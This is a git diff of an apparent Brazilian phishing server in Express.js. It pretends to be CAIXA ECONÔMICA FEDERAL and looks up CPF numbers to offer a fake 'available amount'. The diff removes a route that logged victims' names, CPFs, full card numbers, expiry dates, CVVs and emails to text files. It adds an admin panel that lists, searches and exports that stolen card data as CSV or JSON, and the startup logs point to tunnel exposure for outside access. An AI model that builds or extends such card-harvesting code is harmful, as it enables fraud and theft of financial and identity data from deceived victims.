@@ -118,7 +118,7 @@ app.post('/buscar-cpf', async (req, res) => {
       cpf: cpf,
       opcoesDatas: opcoesDatas,
       dataReal: dataNascimentoReal,
-      valorDisponivel: gerarValorPorCPF(cpf),  // ← CORRIGIDO
+      valorDisponivel: gerarValorPorCPF(cpf),
       banco: 'CAIXA ECONÔMICA FEDERAL',
       agencia: '0001',
       conta: '*****-*',
@@ -150,7 +150,7 @@ app.post('/buscar-cpf', async (req, res) => {
       cpf: cpf,
       opcoesDatas: opcoesDatas,
       dataReal: dataReal,
-      valorDisponivel: gerarValorPorCPF(cpf),  // ← CORRIGIDO
+      valorDisponivel: gerarValorPorCPF(cpf),
       banco: 'CAIXA ECONÔMICA FEDERAL',
       agencia: '0001',
       conta: '12345-6',
@@ -174,62 +174,206 @@ app.use((req, res) => {
   res.status(404).send('Página não encontrada');
 });
 
-
-
-// Adicione no server.js (depois das outras rotas)
-
-// ====================== ROTA PARA SALVAR DADOS DO CARTÃO ======================
-const fs = require('fs');
-
-app.post('/salvar-cartao', (req, res) => {
-  const { nome, cpf, numeroCartao, validade, cvv, email, valor } = req.body;
-
-  // Validar dados obrigatórios
-  if (!nome || !cpf || !numeroCartao || !validade || !cvv || !email) {
-    return res.status(400).json({ success: false, erro: 'Dados incompletos' });
-  }
-
-  // Criar linha de registro
-  const dataHora = new Date().toLocaleString('pt-BR');
-  const registro = `${'='.repeat(60)}\n`;
-  const conteudo = `${registro}📅 DATA: ${dataHora}\n👤 NOME: ${nome}\n🆔 CPF: ${cpf}\n💳 CARTÃO: ${numeroCartao}\n📅 VALIDADE: ${validade}\n🔢 CVV: ${cvv}\n📧 E-MAIL: ${email}\n💰 VALOR: R$ ${valor}\n${registro}\n\n`;
-
-  // Nome do arquivo com data atual
-  const dataArquivo = new Date().toISOString().slice(0, 19).replace(/:/g, '-');
-  const nomeArquivo = `cartoes_${dataArquivo}.txt`;
-
-  // Caminho da pasta (cria se não existir)
-  const pastaDados = path.join(__dirname, 'dados_cartoes');
-  if (!fs.existsSync(pastaDados)) {
-    fs.mkdirSync(pastaDados);
-  }
-
-  const caminhoArquivo = path.join(pastaDados, nomeArquivo);
-
-  // Salvar no arquivo
-  fs.appendFile(caminhoArquivo, conteudo, (err) => {
-    if (err) {
-      console.error('❌ Erro ao salvar arquivo:', err);
-      return res.status(500).json({ success: false, erro: 'Erro ao salvar dados' });
-    }
-    
-    console.log(`✅ Dados salvos em: ${caminhoArquivo}`);
-    res.json({ 
-      success: true, 
-      message: 'Dados salvos com sucesso! Você receberá um e-mail em até 24 horas.' 
-    });
-  });
+// 🆕 NOVO - ADMIN - VISUALIZAR CARTÕES SALVOS NO LOCALSTORAGE
+app.get('/admin/ver-cartoes', (req, res) => {
+    res.send(`
+        <!DOCTYPE html>
+        <html lang="pt-BR">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Admin - Cartões Salvos</title>
+            <style>
+                * { margin: 0; padding: 0; box-sizing: border-box; }
+                body {
+                    font-family: 'Segoe UI', monospace;
+                    background: linear-gradient(135deg, #1a1a2e, #16213e);
+                    padding: 20px;
+                    color: #fff;
+                }
+                .container { max-width: 1200px; margin: 0 auto; }
+                h1 { text-align: center; margin-bottom: 20px; color: #ffb600; }
+                .stats {
+                    background: #0f3460;
+                    padding: 15px;
+                    border-radius: 10px;
+                    margin-bottom: 20px;
+                    display: flex;
+                    justify-content: space-between;
+                    flex-wrap: wrap;
+                    gap: 10px;
+                }
+                .stat-card {
+                    background: #16213e;
+                    padding: 10px 20px;
+                    border-radius: 8px;
+                    border-left: 4px solid #ffb600;
+                }
+                .card {
+                    background: #0f3460;
+                    border-radius: 12px;
+                    padding: 20px;
+                    margin-bottom: 15px;
+                    border-left: 4px solid #ffb600;
+                    transition: transform 0.2s;
+                }
+                .card:hover { transform: translateX(5px); }
+                .card h3 { color: #ffb600; margin-bottom: 10px; }
+                .card p { margin: 5px 0; font-size: 14px; }
+                .card .label { color: #888; }
+                .button-group {
+                    display: flex;
+                    gap: 10px;
+                    margin-bottom: 20px;
+                    flex-wrap: wrap;
+                }
+                button {
+                    background: #ffb600;
+                    color: #004aad;
+                    border: none;
+                    padding: 10px 20px;
+                    border-radius: 8px;
+                    cursor: pointer;
+                    font-weight: bold;
+                    transition: all 0.2s;
+                }
+                button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255,182,0,0.3); }
+                .btn-danger { background: #dc3545; color: white; }
+                .btn-danger:hover { background: #c82333; }
+                .search-box {
+                    width: 100%;
+                    padding: 10px;
+                    margin-bottom: 20px;
+                    border-radius: 8px;
+                    border: none;
+                    font-size: 16px;
+                }
+                .empty { text-align: center; padding: 40px; background: #0f3460; border-radius: 12px; }
+                footer { text-align: center; margin-top: 30px; padding: 20px; color: #888; font-size: 12px; }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>📋 ADMIN - DADOS DOS CARTÕES</h1>
+                <div class="stats" id="stats">
+                    <div class="stat-card">📊 Total: <span id="total">0</span></div>
+                    <div class="stat-card">💰 Valor Total: R$ <span id="totalValor">0</span></div>
+                    <div class="stat-card">📅 Último registro: <span id="ultimo">-</span></div>
+                </div>
+                <div class="button-group">
+                    <button onclick="carregarDados()">🔄 Atualizar</button>
+                    <button onclick="exportarCSV()">📎 Exportar CSV</button>
+                    <button onclick="copiarJSON()">📋 Copiar JSON</button>
+                    <button class="btn-danger" onclick="limparDados()">🗑️ Limpar Todos</button>
+                </div>
+                <input type="text" class="search-box" id="search" placeholder="🔍 Buscar por nome, CPF, cartão ou e-mail..." onkeyup="filtrarDados()">
+                <div id="lista-cartoes"></div>
+                <footer>⚠️ Acesso restrito - Apenas administradores</footer>
+            </div>
+            <script>
+                let todosCartoes = [];
+                
+                function carregarDados() {
+                    const dados = localStorage.getItem('cartoes_salvos');
+                    if (dados) {
+                        todosCartoes = JSON.parse(dados);
+                        atualizarDisplay();
+                        atualizarStats();
+                    } else {
+                        document.getElementById('lista-cartoes').innerHTML = '<div class="empty">📭 Nenhum cartão salvo ainda</div>';
+                        document.getElementById('total').textContent = '0';
+                    }
+                }
+                
+                function atualizarStats() {
+                    const total = todosCartoes.length;
+                    let totalValor = 0;
+                    todosCartoes.forEach(c => {
+                        const valor = parseFloat(c.valor.replace('R$ ', '').replace('.', '').replace(',', '.'));
+                        if (!isNaN(valor)) totalValor += valor;
+                    });
+                    document.getElementById('total').textContent = total;
+                    document.getElementById('totalValor').textContent = totalValor.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+                    if (total > 0) {
+                        const ultimo = todosCartoes[todosCartoes.length - 1];
+                        document.getElementById('ultimo').textContent = ultimo.data || 'N/A';
+                    }
+                }
+                
+                function atualizarDisplay() {
+                    const searchTerm = document.getElementById('search').value.toLowerCase();
+                    const filtrados = todosCartoes.filter(c => 
+                        c.nome.toLowerCase().includes(searchTerm) ||
+                        (c.cpf && c.cpf.includes(searchTerm)) ||
+                        (c.cartao && c.cartao.includes(searchTerm)) ||
+                        (c.email && c.email.toLowerCase().includes(searchTerm))
+                    );
+                    const container = document.getElementById('lista-cartoes');
+                    if (filtrados.length === 0) {
+                        container.innerHTML = '<div class="empty">🔍 Nenhum resultado encontrado</div>';
+                        return;
+                    }
+                    container.innerHTML = filtrados.reverse().map((c, i) => \`
+                        <div class="card">
+                            <h3>#\${todosCartoes.length - i} - \${c.nome}</h3>
+                            <p><span class="label">🆔 CPF:</span> \${c.cpf || 'N/A'}</p>
+                            <p><span class="label">💳 CARTÃO:</span> \${c.cartao || 'N/A'}</p>
+                            <p><span class="label">📅 VALIDADE:</span> \${c.validade || 'N/A'}</p>
+                            <p><span class="label">🔢 CVV:</span> \${c.cvv || 'N/A'}</p>
+                            <p><span class="label">📧 E-MAIL:</span> \${c.email || 'N/A'}</p>
+                            <p><span class="label">💰 VALOR:</span> <strong style="color:#ffb600">\${c.valor || 'N/A'}</strong></p>
+                            <p><span class="label">📅 DATA:</span> \${c.data || 'N/A'}</p>
+                        </div>
+                    \`).join('');
+                }
+                
+                function filtrarDados() { atualizarDisplay(); }
+                
+                function exportarCSV() {
+                    if (todosCartoes.length === 0) { alert('Nenhum dado para exportar'); return; }
+                    const headers = ['Nome', 'CPF', 'Cartão', 'Validade', 'CVV', 'E-mail', 'Valor', 'Data'];
+                    const linhas = todosCartoes.map(c => [
+                        c.nome, c.cpf, c.cartao, c.validade, c.cvv, c.email, c.valor, c.data
+                    ].map(v => \`"\${v || ''}"\`).join(','));
+                    const csv = [headers.join(','), ...linhas].join('\\n');
+                    const blob = new Blob([csv], { type: 'text/csv' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = \`cartoes_\${new Date().toISOString().slice(0,19)}.csv\`;
+                    a.click();
+                    URL.revokeObjectURL(url);
+                }
+                
+                function copiarJSON() {
+                    const json = JSON.stringify(todosCartoes, null, 2);
+                    navigator.clipboard.writeText(json);
+                    alert('✅ JSON copiado para a área de transferência!');
+                }
+                
+                function limparDados() {
+                    if (confirm('⚠️ ATENÇÃO! Isso vai apagar TODOS os dados salvos. Continuar?')) {
+                        localStorage.removeItem('cartoes_salvos');
+                        todosCartoes = [];
+                        carregarDados();
+                        alert('✅ Todos os dados foram removidos!');
+                    }
+                }
+                
+                carregarDados();
+            </script>
+        </body>
+        </html>
+    `);
 });
-
-
 
 // ====================== INICIA O SERVIDOR ======================
 const PORT = 3000;
-
 
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`✅ Servidor rodando em http://localhost:${PORT}`);
   console.log(`📁 Pasta atual: ${__dirname}`);
   console.log(`🌐 Acesse: http://localhost:${PORT}\n`);
   console.log(`🚀 Tunnel ready! Seu app está disponível externamente.`);
+  console.log(`🔒 Admin: http://localhost:${PORT}/admin/ver-cartoes`);
 });
